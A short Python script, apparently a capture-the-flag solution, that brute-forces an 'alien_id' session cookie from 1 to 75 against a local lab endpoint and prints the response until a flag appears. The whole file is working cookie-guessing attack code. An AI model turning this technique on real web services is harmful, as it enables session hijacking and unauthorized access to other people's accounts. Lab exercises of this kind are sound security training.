#
# Write a script that can guess cookie values
# and send them to the url http://127.0.0.1:8082/cookiestore
# Read the response from the logged in cookie value to get the flag.
# The cookie name the aliens are using is alien_id
# we believe the id is a number between 1 and 75
#
# Note: The script can timeout. If this occurs try narrowing
# down your search
#
import http.client
import urllib.parse

# URL to the cookiestore
url = 'http://127.0.0.1:8082/cookiestore'

# Alien_id values are believed to be between 1 and 75
for alien_id in range(1, 76):
    # Construct the cookie value
    cookie_value = f'alien_id={alien_id}'

    # Prepare the headers
    headers = {'Cookie': cookie_value}

    # Parse the URL
    parsed_url = urllib.parse.urlparse(url)

    # Establish a connection
    connection = http.client.HTTPConnection(parsed_url.hostname, parsed_url.port)

    # Construct the request path
    path = parsed_url.path
    if parsed_url.query:
        path += '?' + parsed_url.query

    # Send a GET request
    connection.request('GET', path, headers=headers)

    # Get the response
    response = connection.getresponse()

    # Read and print the response
    response_data = response.read().decode('utf-8')
    print(f'Cookie: {cookie_value}, Response: {response_data}')

    # Check if the flag is in the response
    if 'flag' in response_data.lower():
        print(f'Flag found for alien_id {alien_id}: {response_data}')
        break

    # Close the connection
    connection.close()
